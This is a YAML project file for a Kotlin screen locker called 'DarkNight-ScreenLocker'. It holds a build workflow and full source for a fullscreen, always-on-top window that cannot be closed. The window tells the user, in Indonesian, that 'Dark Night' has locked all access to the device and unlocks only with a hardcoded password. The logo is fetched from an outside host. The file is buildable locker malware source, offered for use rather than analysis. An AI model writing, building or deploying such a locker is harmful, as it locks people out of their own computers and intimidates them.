version: "1.0"
project: "DarkNight-ScreenLocker"
config:
  password: "Xen404"
  image_url: "https://ganga--link--ghhzdp9sv8hk.code.run/i/pa2qw8bgea.jpg"
  window_title: "SYSTEM LOCKED"
  background_color: "#0a0a0a"
  text_color: "#ff3333"
  accent_color: "#00ffcc"

github_workflow: |
  name: Build Dark Night Locker
  on: [push, pull_request]
  jobs:
    build:
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@v4
        - uses: actions/setup-java@v4
          with:
            distribution: 'temurin'
            java-version: '17'
        - name: Compile Kotlin to JAR
          run: |
            curl -sL https://github.com/JetBrains/kotlin/releases/download/v1.9.23/kotlin-compiler-1.9.23.zip -o kotlin.zip
            unzip -q kotlin.zip && sudo mv kotlinc /opt/ && echo "/opt/kotlinc/bin" >> $GITHUB_PATH
            kotlinc ScreenLocker.kt -include-runtime -d ScreenLocker.jar
        - uses: actions/upload-artifact@v4
          with:
            name: DarkNight-Locker-Binary
            path: ScreenLocker.jar

source_code_kotlin: |
  package com.darknight.locker

  import java.awt.*
  import java.awt.event.WindowAdapter
  import java.awt.event.WindowEvent
  import java.net.URL
  import javax.imageio.ImageIO
  import javax.swing.*

  class ScreenLockerApp : JFrame() {
      private val correctPassword = "Xen404"
      private val imageUrl = "https://ganga--link--ghhzdp9sv8hk.code.run/i/pa2qw8bgea.jpg"
      private lateinit var passwordField: JPasswordField
      private lateinit var statusLabel: JLabel
      private var failedAttempts = 0

      init {
          title = "SYSTEM LOCKED - DARK NIGHT"
          defaultCloseOperation = DO_NOTHING_ON_CLOSE
          isUndecorated = true
          isAlwaysOnTop = true
          background = Color(10, 10, 10)

          val device = GraphicsEnvironment.getLocalGraphicsEnvironment().defaultScreenDevice
          if (device.isFullScreenSupported) {
              device.fullScreenWindow = this
          } else {
              extendedState = MAXIMIZED_BOTH
          }

          initUI()
          
          addWindowListener(object : WindowAdapter() {
              override fun windowClosing(e: WindowEvent?) {}
          })
      }

      private fun initUI() {
          val mainPanel = JPanel().apply {
              layout = GridBagLayout()
              background = Color(10, 10, 10)
          }
          val gbc = GridBagConstraints().apply {
              gridx = 0
              gridy = GridBagConstraints.RELATIVE
              insets = Insets(10, 10, 10, 10)
              anchor = GridBagConstraints.CENTER
          }

          try {
              val url = URL(imageUrl)
              val originalImage = ImageIO.read(url)
              val scaledImage = originalImage.getScaledInstance(150, 150, Image.SCALE_SMOOTH)
              val logoLabel = JLabel(ImageIcon(scaledImage))
              mainPanel.add(logoLabel, gbc)
          } catch (e: Exception) {
              val errorLabel = JLabel("[ Gagal Memuat Logo dari Server ]").apply {
                  foreground = Color(255, 85, 85)
                  font = Font("Courier New", Font.BOLD, 12)
              }
              mainPanel.add(errorLabel, gbc)
          }

          val titleLabel = JLabel("SYSTEM LOCKED").apply {
              foreground = Color(255, 51, 51)
              font = Font("Courier New", Font.BOLD, 28)
          }
          mainPanel.add(titleLabel, gbc)

          val descLabel = JLabel("<html><center>Seluruh akses ke perangkat ini telah dikunci oleh Dark Night.<br>Masukkan password yang valid untuk memulihkan sistem.</center></html>").apply {
              foreground = Color(204, 204, 204)
              font = Font("Arial", Font.PLAIN, 13)
          }
          mainPanel.add(descLabel, gbc)

          passwordField = JPasswordField(20).apply {
              font = Font("Courier New", Font.BOLD, 18)
              background = Color(26, 26, 26)
              foreground = Color(0, 255, 204)
              caretColor = Color(0, 255, 204)
              horizontalAlignment = JTextField.CENTER
              addActionListener { verifyPassword() }
          }
          mainPanel.add(passwordField, gbc)

          val unlockButton = JButton("UNLOCK SYSTEM").apply {
              font = Font("Courier New", Font.BOLD, 14)
              background = Color(255, 51, 51)
              foreground = Color.WHITE
              isFocusPainted = false
              addActionListener { verifyPassword() }
          }
          mainPanel.add(unlockButton, gbc)

          statusLabel = JLabel("").apply {
              foreground = Color(255, 85, 85)
              font = Font("Arial", Font.ITALIC, 11)
          }
          mainPanel.add(statusLabel, gbc)

          add(mainPanel)
      }

      private fun verifyPassword() {
          val enteredPass = String(passwordField.password)
          if (enteredPass == correctPassword) {
              statusLabel.foreground = Color(0, 255, 204)
              statusLabel.text = "Akses Diterima. Membuka sistem..."
              Timer(1000) {
                  dispose()
                  System.exit(0)
              }.apply {
                  isRepeats = false
                  start()
              }
          } else {
              failedAttempts++
              statusLabel.foreground = Color(255, 51, 51)
              statusLabel.text = "Password Salah! Percobaan gagal ke-$failedAttempts"
              passwordField.text = ""
          }
      }
  }

  fun main() {
      EventQueue.invokeLater {
          ScreenLockerApp().isVisible = true
      }
  }
